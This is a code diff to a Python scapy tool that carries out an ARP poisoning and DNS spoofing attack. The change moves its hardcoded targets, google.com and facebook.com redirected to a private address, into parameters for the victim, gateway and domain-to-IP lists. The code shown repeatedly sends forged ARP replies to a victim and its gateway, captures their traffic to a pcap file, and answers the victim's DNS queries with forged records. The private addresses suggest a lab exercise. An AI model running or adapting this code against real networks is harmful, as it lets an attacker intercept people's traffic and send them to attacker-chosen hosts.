@@ -6,20 +6,11 @@ import netifaces as ni
 # Constants
 DIVIDER = '=' * 60
 POISON_BREAK = 30
-SPOOF_DOMAIN_NAME = 'www.google.com'
-REDIRECT_IP = '192.168.56.102'
-
-# DNS Spoofing targets
-dns_hosts = {
-    b"www.google.com.": "10.0.2.6",
-    b"google.com.": "10.0.2.6",
-    b"facebook.com.": "10.0.2.6"
-}
 
 # ARP DNS Spoofing Attack
 class ARPDNSSpoofing():
     # Constructs the ARP DNS Spoofing Attack
-    def __init__(self, victimIP, interface):
+    def __init__(self, victimIP, gatewayIP, dnsList, dnsIPList, interface):
         # Disables verbosity (command line) mode
         scapy.conf.verb = 0
         
@@ -28,17 +19,22 @@ class ARPDNSSpoofing():
 
         # Assign targets
         self.victimIP = victimIP
+        self.gatewayIP = gatewayIP
+        self.dnsList = dnsList
+        self.dnsIPList = dnsIPList
         self.interface = interface
-        self.routerIP = scapy.conf.route.route('0.0.0.0')[2] # Gateway ip address
 
         # Assign macAddresses
         self.victimMac = scapy.getmacbyip(victimIP)
         if not self.victimMac: # If victim MAC not found
             raise ValueError("Cannot find MAC address for victim IP: {}".format(victimIP))
 
-        self.routerMac = scapy.getmacbyip(self.routerIP)
-        if not self.routerMac: # If router MAC not found
-            raise ValueError("Cannot find MAC address for router IP: {}".format(self.routerIP))
+        self.gatewayMac = scapy.getmacbyip(self.gatewayIP)
+        if not self.gatewayMac: # If gateway MAC not found
+            raise ValueError("Cannot find MAC address for gateway IP: {}".format(self.gatewayIP))
+
+        # Generate dns dictionary
+        self.dnsDictionary = {(dnsList[index] + '.').encode(): dnsIPList[index] for index in range(len(dnsList))} # Assume right size
 
         self.deviceMac = scapy.get_if_hwaddr(interface)
 
@@ -64,15 +60,15 @@ class ARPDNSSpoofing():
         # Setup packets
         # ARP Poisoning packet for victim one
         victimPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
-                           psrc = self.routerIP,
+                           psrc = self.gatewayIP,
                            pdst = self.victimIP, 
                            hwdst = self.victimMac)
 
         # ARP Poisoning packet for victim two
-        routerPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
+        gatewayPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                             psrc = self.victimIP,
-                            pdst = self.routerIP,
-                            hwdst = self.routerMac)
+                            pdst = self.gatewayIP,
+                            hwdst = self.gatewayMac)
 
         # Sniffing process
         sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)
@@ -84,7 +80,7 @@ class ARPDNSSpoofing():
         while True:
             try: # Send poison packets
                 scapy.send(victimPoisonPacket)
-                scapy.send(routerPoisonPacket)
+                scapy.send(gatewayPoisonPacket)
                 time.sleep(POISON_BREAK)
             except KeyboardInterrupt: # CTRL-C was pressed
                 sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
@@ -99,11 +95,10 @@ class ARPDNSSpoofing():
         scapy.wrpcap('captured_packets.pcap', incomingPackets)
 
     # DNS spoof packets
-    # DNS spoof packets
     def dnsSpoof(self, packet):
         if packet.haslayer(scapy.IP) and packet.haslayer(scapy.DNSQR):
             source_dest = packet[scapy.IP].src
-            if source_dest == self.victimIP and packet[scapy.DNSQR].qname in dns_hosts:
+            if source_dest == self.victimIP and packet[scapy.DNSQR].qname in self.dnsDictionary:
                 if packet.haslayer(scapy.DNS):
                     # Construct a new packet
                     new_packet = scapy.Ether(src=packet[scapy.Ether].dst, dst=packet[scapy.Ether].src) / \
@@ -111,7 +106,7 @@ class ARPDNSSpoofing():
                                 scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                                 scapy.DNS(id=packet[scapy.DNS].id, qd=packet[scapy.DNS].qd, aa=1, qr=1,
                                         an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, type='A', ttl=624,
-                                                        rdata=dns_hosts[packet[scapy.DNSQR].qname]))
+                                                        rdata=self.dnsDictionary[packet[scapy.DNSQR].qname]))
 
                     scapy.sendp(new_packet, iface=self.interface)
                     print("DNS packet was sent with: " + new_packet.summary() + " to ip: " + new_packet[scapy.IP].dst)
@@ -126,15 +121,13 @@ class ARPDNSSpoofing():
 
                     scapy.send(packet)
 
-
-
     # Clean ARP tables of the victims
     def clean(self):
         # Clean victim one's ARP Table
         scapy.send(scapy.ARP(
             op=2,
-            psrc=self.routerIP,
-            hwsrc=self.routerMac,
+            psrc=self.gatewayIP,
+            hwsrc=self.gatewayMac,
             pdst=self.victimIP,
             hwdst="ff:ff:ff:ff:ff:ff"), count=5)
         # Clean victim two's ARP Table
@@ -142,8 +135,9 @@ class ARPDNSSpoofing():
             op=2,
             psrc=self.victimIP,
             hwsrc=self.victimMac,
-            pdst=self.routerIP,
+            pdst=self.gatewayIP,
             hwdst="ff:ff:ff:ff:ff:ff"), count=5)
+
     #check if the posioning was sucessful
     def check_arp_poisoning(self):
         # Send an ICMP echo request (ping) to the victim
